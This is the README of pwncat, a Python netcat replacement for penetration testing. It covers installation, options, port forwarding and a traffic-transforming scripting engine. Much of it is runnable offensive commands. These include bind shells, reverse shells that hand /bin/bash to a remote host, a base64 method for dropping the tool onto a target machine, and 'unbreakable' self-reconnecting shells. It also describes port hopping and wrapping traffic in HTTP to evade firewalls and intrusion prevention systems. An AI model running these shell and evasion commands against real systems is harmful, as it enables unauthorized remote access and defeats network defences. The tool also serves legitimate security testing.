# pwncat

**[Install](#tada-install)** |
**[TL;DR](#coffee-tldr)** |
**[Features](#star-features)** |
**[Behaviour](#cop-behaviour)** |
**[Docs](#closed_book-documentation)** |
**[Usage](#computer-usage)** |
**[Examples](#bulb-examples)** |
**[FAQ](#information_source-faq)** |
**[Contributing](#octocat-contributing)** |
**[Disclaimer](#exclamation-disclaimer)** |
**[License](#page_facing_up-license)**

[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)

[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)
[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)


> &nbsp;
> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)).
> &nbsp;

| :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |
|---|

<table border="0" cellpadding="0" cellspacing="0" style="border-collapse:collapse; border:none;">
 <thead>
  <tr valign="top" border="0" cellpadding="0" cellspacing="0" style="border:none;">
   <th border="0" cellpadding="0" cellspacing="0" style="border:none;">Code Style</td>
   <th border="0" cellpadding="0" cellspacing="0" style="border:none;"></td>
   <th border="0" cellpadding="0" cellspacing="0" style="border:none;">Integration Tests</td>
  </tr>
 </thead>
 <tbody>
  <tr valign="top" border="0" cellpadding="0" cellspacing="0" style="border:none;">
   <td border="0" cellpadding="0" cellspacing="0" style="border:none;">
    <table>
     <thead>
      <tr>
       <th>Styler</th>
       <th>Status</th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td><a href="https://github.com/psf/black">Black</a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=black"><img src="https://github.com/cytopia/pwncat/workflows/black/badge.svg" /></a></td>
      </tr>
      <tr>
       <td><a href="https://github.com/python/mypy">mypy</a> <sup><small>[1]</small></sup></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mypy"><img src="https://github.com/cytopia/pwncat/workflows/mypy/badge.svg" /></a></td>
      </tr>
      <tr>
       <td><a href="https://github.com/PyCQA/pycodestyle">pycodestyle</a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=pycode"><img src="https://github.com/cytopia/pwncat/workflows/pycode/badge.svg" /></a></td>
      </tr>
      <tr>
       <td><a href="https://github.com/PyCQA/pydocstyle">pydocstyle</a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=pydoc"><img src="https://github.com/cytopia/pwncat/workflows/pydoc/badge.svg" /></a></td>
      </tr>
      <tr>
       <td><a href="https://github.com/PyCQA/pylint">pylint</a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=pylint"><img src="https://github.com/cytopia/pwncat/workflows/pylint/badge.svg" /></a></td>
      </tr>
     </tbody>
    </table>
   </td>
   <td border="0" cellpadding="0" cellspacing="0" style="border:none;"></td>
   <td border="0" cellpadding="0" cellspacing="0" style="border:none;">
    <table>
     <thead>
      <tr>
       <th><sub>Python</sub><sup>OS</sup></th>
       <th>Linux</th>
       <th>MacOS</th>
       <th>Windows <sup><small>[2]</small></sup></th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <th>2.7</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7"><img src="https://github.com/cytopia/pwncat/workflows/ubu-2.7/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-2.7"><img src="https://github.com/cytopia/pwncat/workflows/mac-2.7/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-2.7"><img src="https://github.com/cytopia/pwncat/workflows/win-2.7/badge.svg" /></a></td>
      </tr>
      <tr>
       <th>3.5</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.5/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.5"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.5/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.5"><img src="https://github.com/cytopia/pwncat/workflows/win-3.5/badge.svg" /></a></td>
      </tr>
      <tr>
       <th>3.6</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.6/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.6"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.6/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.6"><img src="https://github.com/cytopia/pwncat/workflows/win-3.6/badge.svg" /></a></td>
      </tr>
      <tr>
       <th>3.7</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.7/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.7"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.7/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.7"><img src="https://github.com/cytopia/pwncat/workflows/win-3.7/badge.svg" /></a></td>
      </tr>
      <tr>
       <th>3.8</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8"><img src="https://github.com/cytopia/pwncat/workflows/ubu-3.8/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-3.8"><img src="https://github.com/cytopia/pwncat/workflows/mac-3.8/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-3.8"><img src="https://github.com/cytopia/pwncat/workflows/win-3.8/badge.svg" /></a></td>
      </tr>
      <tr>
       <th>pypy2</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-py2"><img src="https://github.com/cytopia/pwncat/workflows/ubu-py2/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-py2"><img src="https://github.com/cytopia/pwncat/workflows/mac-py2/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-py2"><img src="https://github.com/cytopia/pwncat/workflows/win-py2/badge.svg" /></a></td>
      </tr>
      <tr>
       <th>pypy3</th>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=ubu-py3"><img src="https://github.com/cytopia/pwncat/workflows/ubu-py3/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=mac-py3"><img src="https://github.com/cytopia/pwncat/workflows/mac-py3/badge.svg" /></a></td>
       <td><a href="https://github.com/cytopia/pwncat/actions?workflow=win-py3"><img src="https://github.com/cytopia/pwncat/workflows/win-py3/badge.svg" /></a></td>
      </tr>
     </tbody>
    </table>
   </td>
  </tr>
 </tbody>
<table>

> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.55%)</strong></sup><br/>
> <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>


#### Motivation
Ever accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?
Ever waited forever for your client to connect back to you, because the Firewall didn't let it out?
Ever had a connection loss because an IPS closed suspicious ports?
Ever were in need of a quick port forwarding?<br/>
> **This one got you covered.**

Apart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single
tool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.
(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).


## :tada: Install
```bash
pip install pwncat
```


## :coffee: TL;DR

This is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.

### Deploy to target
```bash
# Copy base64 data to clipboard from where you have internet access
curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64

# Paste it on the target machine
echo "<BASE64 STRING>" | base64 -d > pwncat
chmod +x pwncat
```

### Summon shells
```bash
# Bind shell
pwncat -l -e '/bin/bash' 8080
```
```bash
# Reverse shell (Ctrl+c proof)
pwncat -e '/bin/bash' example.com 4444 --recon -1 --recon-wait 10
```
```bash
# Reverse UDP shell (Ctrl+c proof)
pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 10
```

### Local port forward `-L` (listening proxy)
```bash
# Make remote MySQL server (remote port 3306) available on current machine
# on every interface on port 5000
pwncat -L 0.0.0.0:5000 everythingcli.org 3306
```
```bash
# Same, but convert traffic on your end to UDP
pwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u
```

### Remote port forward `-R` (double client Proxy)
```bash
# Connect to Remote MySQL server (remote port 3306) and then connect to another
# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic
pwncat -R 10.0.0.1:4444 everythingcli.org 3306
```
```bash
# Same, but convert traffic on your end to UDP
pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
```

> <sub>[SSH Tunnelling for fun and profit :link:](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/)</sub><br/>
> <sub>[`pwncat` example: Port forwarding magic](#port-forwarding-magic)<sub>


## :star: Features

### At a glance

`pwncat` has many features, below is only a list of outstanding characteristics.

| Feature        | Description |
|----------------|-------------|
| [PSE](pse)     | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |
| Bind shell     | Create bind shells |
| Reverse shell  | Create reverse shells |
| Port Forward   | Local and remote port forward (Proxy server/client) |
| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |
| Detect Egress  | Scan and report open egress ports on the target (port hopping) |
| Evade FW       | Evade egress firewalls by round-robin outgoing ports (port hopping) |
| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |
| UDP rev shell  | Try this with the traditional `netcat` |
| TCP / UDP      | Full TCP and UDP support |
| Python 2+3     | Works with Python 2, Python 3, pypy2 and pypy3 |
| Cross OS       | Work on Linux, MacOS and Windows as long as Python is available |
| Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |
| Portable       | Single file which only uses core packages - no external dependencies required. |


### Feature comparison matrix

|                     | pwncat | netcat | ncat |
|---------------------|--------|---------|-----|
| Scripting engine    | Python | :x:     | Lua |
| IP ToS              | :x:    | ✔       | :x: |
| IPv4                | ✔      | ✔       | ✔   |
| IPv6                | *      | ✔       | ✔   |
| Unix domain sockets | :x:    | ✔       | ✔   |
| TCP                 | ✔      | ✔       | ✔   |
| UDP                 | ✔      | ✔       | ✔   |
| SCTP                | :x:    | :x:     | ✔   |
| Command exec        | ✔      | ✔       | ✔   |
| Inbound port scan   | *      | ✔       | ✔   |
| Outbound port scan  | ✔      | :x:     | :x: |
| Hex dump            | *      | ✔       | ✔   |
| Telnet              | :x:    | ✔       | ✔   |
| SSL                 | :x:    | :x:     | ✔   |
| HTTP                | *      | :x:     | :x: |
| HTTPS               | *      | :x:     | :x: |
| Chat                | ✔      | ✔       | ✔   |
| Broker              | :x:    | :x:     | ✔   |
| Simultaneous conns  | :x:    | :x:     | ✔   |
| Allow/deny          | :x:    | :x:     | ✔   |
| Local port forward  | ✔      | :x:     | :x: |
| Remote port forward | ✔      | :x:     | :x: |
| Re-accept           | ✔      | ✔       | ✔   |
| Proxy               | :x:    | ✔       | ✔   |
| UDP reverse shell   | ✔      | :x:     | :x: |
| Respawning client   | ✔      | :x:     | :x: |
| Port hopping        | ✔      | :x:     | :x: |
| Emergency shutdown  | ✔      | :x:     | :x: |

> <sup>`*` Feature is currently under development.


## :cop: Behaviour

Like the original implementation of `netcat`, when using **TCP**, `pwncat`
(in client and listen mode) will automatically quit, if the network connection has been terminated,
properly or improperly.

In case the remote peer does not terminate the connection, or in **UDP** mode, `pwncat` will stay open.

Have a look at the following illustratoins to better understand the behaviour:

```bash
# [Valid HTTP request] Does not quit, web server keeps connection intact
printf "GET / HTTP/1.1\n\n" | pwncat www.google.com 80
```

```bash
# [Invalid HTTP request] Quits, because the web server closes the connection
printf "GET / \n\n" | pwncat www.google.com 80
```

```bash
# [TCP]
# Neither of both, client and server will quit after successful transfer
# and they will be stuck, waiting for more input or output.
# When exiting one (e.g.: via Ctrl+c), the other one will quit as well.
pwncat -l 4444 > output.txt
pwncat localhost 4444 < input.txt
```

```bash
# [UDP]
# Neither of both, client and server will quit after successful transfer
# and they will be stuck, waiting for more input or output.
# When exiting one (e.g.: via Ctrl+c), the other one will still stay open in UDP mode.
pwncat -u -l 4444 > output.txt
pwncat -u localhost 4444 < input.txt
```

There are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)
section for more advanced adjustments.


## :closed_book: Documentation

Documentation will evolve over time.

* API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)
* Python type coverage can be found here: [pwncat.type.html](https://cytopia.github.io/pwncat/pwncat.type.html)
* HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)
* Raw man page can be found here: [pwncat.1](man/pwncat.1)


## :computer: Usage

Type `pwncat -h` or click below to see all available options.

<details>
  <summary><strong>Click here to expand usage</strong></summary>

```
usage: pwncat [-Cnuv] [-e cmd] hostname port
       pwncat [-Cnuv] [-e cmd] -l [hostname] port
       pwncat [-Cnuv] -z hostname port
       pwncat [-Cnuv] -L addr:port hostname port
       pwncat [-Cnuv] -R addr:port hostname port
       pwncat -V, --version
       pwncat -h, --help


Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See advanced options for how to automatically
reconnect.

positional arguments:
  hostname              Address to listen, forward or connect to
  port                  Port to listen, forward or connect to

mode arguments:
  -l, --listen          [Listen mode]:
                        Start a server and listen for incoming connections.
                        If using TCP and a connected client disconnects or the
                        connection is interrupted otherwise, the server will
                        quit. See -k/--keep-open to change this behaviour.

  -z, --zero            [Zero-I/0 mode]:
                        Connect to a remote endpoint and report status only.
                        Used for port scanning.

  -L addr:port, --local addr:port
                        [Local forward mode]:
                        This mode will start a server and a client internally.
                        The internal server will listen locally on specified
                        hostname/port (positional arguments). Same as with -l.
                        The server will then forward traffic to the internal
                        client which connects to another server specified by
                        address given via -L/--local addr:port.
                        (I.e.: proxies a remote service to a local address)

  -R addr:port, --remote addr:port
                        [Remote forward mode]:
                        This mode will start two clients internally. One is
                        connecting to the target and one is connecting to
                        another pwncat/netcat server you have started some-
                        where. Once connected, it will then proxy traffic
                        between you and the target.
                        This mode should be applied on machines that block
                        incoming traffic and only allow outbound.
                        The connection to your listening server is given by
                        -R/--remote addr:port and the connection to the
                        target machine via the positional arguments.

optional arguments:
  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
  -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
                        line endings for input and outout accordingly. Specify
                        'no' to completely remove any line feeds. By default
                        it will not replace anything and takes what is entered
                        (usually CRLF on Windows, LF on Linux and some times
                        CR on MacOS).
  -n, --nodns           Do not resolve DNS.
  -u, --udp             Use UDP for the connection instead of TCP.
  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                        or -vvvv for more verbosity. The server performance will
                        decrease drastically if you use more than three times.
  -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.
                        In 'auto' mode, color is displayed as long as the output
                        goes to a terminal. If it is piped into a file, color
                        will automatically be disabled. This mode also disables
                        color on Windows by default. (default: auto)

advanced arguments:
  --script-send file    All modes (TCP and UDP):
                        A Python scripting engine to define your own custom
                        transformer function which will be executed before
                        sending data to a remote endpoint. Your file must
                        contain the exact following function which will:
                        be applied as the transformer:
                        def transform(data, pse):
                            # NOTE: the function name must be 'transform'
                            # NOTE: the function param name must be 'data'
                            # NOTE: indentation must be 4 spaces
                            # ... your transformations goes here
                            return data
                        You can also define as many custom functions or classes
                        within this file, but ensure to prefix them uniquely to
                        not collide with pwncat's function or classes, as the
                        file will be called with exec().

  --script-recv file    All modes (TCP and UDP):
                        A Python scripting engine to define your own custom
                        transformer function which will be executed after
                        receiving data from a remote endpoint. Your file must
                        contain the exact following function which will:
                        be applied as the transformer:
                        def transform(data, pse):
                            # NOTE: the function name must be 'transform'
                            # NOTE: the function param name must be 'data'
                            # NOTE: indentation must be 4 spaces
                            # ... your transformations goes here
                            return data
                        You can also define as many custom functions or classes
                        within this file, but ensure to prefix them uniquely to
                        not collide with pwncat's function or classes, as the
                        file will be called with exec().

  --http                Connect / Listen / Local forward mode (TCP only):
                        Hide traffic in http packets to fool Firewalls/IDS/IPS.

  --https               Connect / Listen / Local forward mode (TCP only):
                        Hide traffic in https packets to fool Firewalls/IDS/IPS.

  -k, --keep-open       Listen mode (TCP only):
                        Re-accept new clients in listen mode after a client has
                        disconnected or the connection is unterrupted otherwise.
                        (default: server will quit after connection is gone)

  --rebind x            Listen mode (TCP and UDP):
                        If the server is unable to bind, it will re-initialize
                        itself x many times before giving up. Use -1 to re-init
                        endlessly. (default: fail after first unsuccessful try).

  --rebind-wait s       Listen mode (TCP and UDP):
                        Wait x seconds between re-initialization. (default: 1)

  --rebind-robin port   Listen mode (TCP and UDP):
                        If the server is unable to initialize (e.g: cannot bind
                        and --rebind is specified, it it will shuffle ports in
                        round-robin mode to bind to. Use comma separated string
                        such as '80,81,82' or a range of ports '80-100'.
                        Set --rebind to at least the number of ports to probe +1
                        This option requires --rebind to be specified.

  --reconn x            Connect mode / Zero-I/O mode (TCP only):
                        If the remote server is not reachable or the connection
                        is interrupted, the client will connect again x many
                        times before giving up. Use -1 to retry endlessly.
                        (default: quit if the remote is not available or the
                        connection was interrupted)
                        This might be handy for stable TCP reverse shells ;-)

  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):
                        Wait x seconds between re-connects. (default: 1)

  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):
                        If the remote server is not reachable or the connection
                        is interrupted and --reconn is specified, the client
                        will shuffle ports in round-robin mode to connect to.
                        Use comma separated string such as '80,81,82' or a range
                        of ports '80-100'.
                        Set --reconn to at least the number of ports to probe +1
                        This helps reverse shell to evade intrusiona prevention
                        systems that will cut your connection and block the
                        outbound port.
                        This is also useful in Connect or Zero-I/O mode to
                        figure out what outbound ports are allowed.

  -w s, --wait s        Connect mode (TCP only):
                        If a connection and stdin are idle for more than s sec,
                        then the connection is silently closed and the client
                        will exit. (default: wait forever).
                        Note: if --reconn is specified, the connection will be
                        re-opened.

  --ping-init           Connect mode / Zero-I/O mode (TCP and UDP):
                        UDP is a stateless protocol unlike TCP, so no hand-
                        shake communication takes place and the client just
                        sends data to a server without being "accepted" by
                        the server first.
                        This means a server waiting for an UDP client to
                        connect to, is unable to send any data to the client,
                        before the client hasn't send data first. The server
                        simply doesn't know the IP address before an initial
                        connect.
                        The --ping-init option instructs the client to send one
                        single initial ping packet to the server, so that it is
                        able to talk to the client.
                        This is the only way to make a UDP reverse shell work.
                        See --ping-word for what char/string to send as initial
                        ping packet (default: '\0')

  --ping-intvl s        Connect mode / Zero-I/O mode (TCP and UDP):
                        Instruct the client to send ping intervalls every s sec.
                        This allows you to restart your UDP server and just wait
                        for the client to report back in. This might be handy
                        for stable UDP reverse shells ;-)
                        See --ping-word for what char/string to send as initial
                        ping packet (default: '\0')

  --ping-word str       Connect mode / Zero-I/O mode (TCP and UDP):
                        Change the default character '\0' to use for upd ping.
                        Single character or strings are supported.

  --ping-robin port     Connect mode / Zero-I/O mode (TCP and UDP):
                        Instruct the client to shuffle the specified ports in
                        round-robin mode for a remote server to ping.
                        This might be handy to scan outbound allowed ports.
                        Use --ping-intvl 0 to be faster.

  --safe-word str       All modes:
                        If pwncat is started with this argument, it will shut
                        down as soon as it receives the specified string. The
                        --keep-open (server) or --reconn (client) options will
                        be ignored and it won't listen again or reconnect to you.
                        Use a very unique string to not have it shut down
                        accidentally by other input.

misc arguments:
  -h, --help            Show this help message and exit
  -V, --version         Show version information and exit
```
</details>


## :bulb: Examples

### Upgrade your shell to interactive
<!--
<details>
  <summary>Click to expand</summary>
-->

> This is a universal advice and not only works with `pwncat`, but with all other common tools.

When connected with a reverse or bind shell you'll notice that no interactive commands will work and
hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.
To fix this, you'll need to attach it to a TTY (make it interactive). Here's how:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<kbd>Ctrl</kbd>+<kbd>z</kbd>
```bash
# get your current terminal size (rows and columns)
stty size

# for bash/sh (enter raw mode and disable echo'ing)
stty raw -echo
fg

# for zsh (enter raw mode and disable echo'ing)
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm
stty rows <num> columns <cols>   # <num> and <cols> values found above by 'stty size'
```
> <sup>[1] [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)</sup>

<!--
</details>
-->

### Unbreakable UDP reverse shell

<!--
<details>
  <summary>Click to expand</summary>
-->

Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.
```bash
# The client
# --exec            # Provide this executable
# --nodns           # Keep the noise down and don't resolve hostnames
# --udp             # Use UDP mode
# --ping-intvl      # Ping the server every 10 seconds

pwncat --exec /bin/bash --nodns --udp --ping-intvl 10 10.0.0.1 4444
```
If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
```bash
# The server
# -u   # Use UDP mode
# -l   # Listen for incoming connections
pwncat -u -l -vvvvv
```
You will see (among all the gibberish) a TRACE message:
```
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
```
As soon as you saw this on the listener, you can issue commands to the client.
All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
your server and start it again in silent mode:
```bash
# The server
pwncat -u -l -vvvvv
```
Now wait a maximum of 10 seconds and you can issue commands.
Having no info messages at all, is also troublesome. You might want to know what is going
on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
the notifications to a logfile:
```bash
# The server
# 2> comm.txt   # This redirects the messages to a logfile instead
pwncat -u -l -vvv 2> comm.txt
```
Now all you'll see in your server window are the actual command inputs and outputs.
If you want to see what's going on behind the scene, open a second terminal window and tail
the `comm.txt` file:
```
# View communication info
tail -fn50 comm.txt

[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
```
<!--
</details>
-->

### Port forwarding magic

<!--
<details>
  <summary>Click to expand</summary>
-->

#### Local TCP port forwarding

**Scenario**
1. Alice can be reached from the Outside (TCP/UDP)
2. Bob can only be reached from Alice's machine
```
                              |                               |
        Outside               |           DMZ                 |        private subnet
                              |                               |
                              |                               |
     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
     |                 |      |      | pwncat          |      |      | MySQL           |
     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
     +-----------------+      |      +-----------------+      |      +-----------------+
     pwncat 72.0.0.1 3306     |      pwncat \                 |
                              |        -L 72.0.0.1:3306 \     |
                              |         10.0.0.1 3306         |
```

#### Local UDP port forwarding

**Scenario**
1. Alice can be reached from the Outside (but only via UDP)
2. Bob can only be reached from Alice's machine
```
                              |                               |
        Outside               |           DMZ                 |        private subnet
                              |                               |
                              |                               |
     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
     |                 |      |      | pwncat -L       |      |      | MySQL           |
     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
     +-----------------+      |      +-----------------+      |      +-----------------+
     pwncat -u 72.0.0.1 3306  |      pwncat -u \              |
                              |        -L 72.0.0.1:3306 \     |
                              |        10.0.0.1 3306          |
```

#### Remote TCP port forward

**Scenario**
1. Alice cannot be reached from the Outside
2. Alice is allowed to connect to the Outside (TCP/UDP)
3. Bob can only be reached from Alice's machine
```
                              |                               |
        Outside               |           DMZ                 |        private subnet
                              |                               |
                              |                               |
     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
     |                 |      |      | pwncat          |      |      | MySQL           |
     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
     +-----------------+      |      +-----------------+      |      +-----------------+
     pwncat -l 4444           |      pwncat --reconn -1 \     |
                              |        -R 56.0.0.1:4444 \     |
                              |        10.0.0.1 3306          |
```

#### Remote UDP port forward

**Scenario**
1. Alice cannot be reached from the Outside
2. Alice is allowed to connect to the Outside (UDP: DNS only)
3. Bob can only be reached from Alice's machine
```
                              |                               |
        Outside               |           DMZ                 |        private subnet
                              |                               |
                              |                               |
     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
     |                 |      |      | pwncat          |      |      | MySQL           |
     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
     +-----------------+      |      +-----------------+      |      +-----------------+
     pwncat -u -l 53          |      pwncat -u --reconn -1 \  |
                              |        -R 56.0.0.1:4444 \     |
                              |        10.0.0.1 3306          |
```
<!--
</details>
-->


### Outbound port hopping

If you have no idea what outbound ports are allowed from the target machine, you can instruct
the client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.

```bash
# Reverse shell on target (the client)
# --exec            # The command shell the client should provide
# --reconn          # Instruct it to reconnect endlessly
# --reconn-wait     # Reconnect every 0.1 seconds
# --reconn-robin    # Use these ports to probe for outbount connections

pwncat --exec /bin/bash --reconn -1 --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53
```

Once the client is up and running, either use raw sockets to check for inbound traffic or use
something like Wireshark or tcpdump to find out from where the client is able to connect back to you,

If you found one or more ports that the client is able to connect to you,
simply start your listener locally and wait for it to come back.
```bash
pwncat -l <ip> <port>
```
If the client connects to you, you will have a working reverse shell. If you stop your local
listening server accidentally or on purpose, the client will probe ports again until it connects successfully.
In order to kill the reverse shell client, you can use `--safe-word` (when starting the client).


If none of this succeeds, you can add other measures such as using UDP or even wrapping your
packets into higher level protocols, such as HTTP or others. See [PSE](pse) or examples below
for how to transform your traffic.


### Pwncat Scripting Engine ([PSE](pse))

`pwncat` offers a Python based scripting engine to inject your custom code before sending and
after receiving data.

#### How it works

You will simply need to provide a Python file with the following entrypoint function:
```python
def transform(data, pse):
    # Example to reverse a string
    return data[::-1]
```
Both, the function name must be named `transform` and the parsed arguments must be named `data` and `pse`.
Other than that you can add as much code as you like. Each instance of `pwncat` can take two scripts:

1. `--script-send`: script will be applied before sending
2. `--script-recv`: script will be applied after receiving

See [here](pse) for API and more details


#### Example 1: Self-built asymmetric encryption

> PSE: [asym-enc](pse/asym-enc) source code

This will encrypt your traffic asymmetrically. It is just a very basic [ROT13](https://en.wikipedia.org/wiki/ROT13) implementation with different shift lengths on both sides to *emulate* asymmetry. You could do the same and implement GPG based asymmetric encryption for PSE.

```bash
# server
pwncat -vvvv -l localhost 4444 \
  --script-send pse/asym-enc/pse-asym_enc-server_send.py \
  --script-recv pse/asym-enc/pse-asym_enc-server_recv.py
```
```bash
# client
pwncat -vvvv localhost 4444 \
  --script-send pse/asym-enc/pse-asym_enc-client_send.py \
  --script-recv pse/asym-enc/pse-asym_enc-client_recv.py
```

#### Example 2: Self-built HTTP POST wrapper

> PSE: [http-post](pse/http-post) source code

This will wrap all traffic into a valid HTTP POST request, making it look like normal HTTP traffic.

```bash
# server
pwncat -vvvv -l localhost 4444 \
  --script-send pse/http-post/pse-http_post-pack.py \
  --script-recv pse/http-post/pse-http_post-unpack.py
```
```bash
# client
pwncat -vvvv localhost 4444 \
  --script-send pse/http-post/pse-http_post-pack.py \
  --script-recv pse/http-post/pse-http_post-unpack.py
```


## :information_source: FAQ

**Q**: Is `pwncat` compatible with `netcat`?

**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.


**Q**: Does it work on X?

**A**: In its current state it works with Python 2 and 3 and is fully tested on Linux and MacOS. Windows support is still experimental.


**Q**: I found a bug / I have to suggest a new feature! What can I do?

**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).


## :lock: [cytopia](https://github.com/cytopia) sec tools

Below is a list of sec tools and docs I am maintaining.

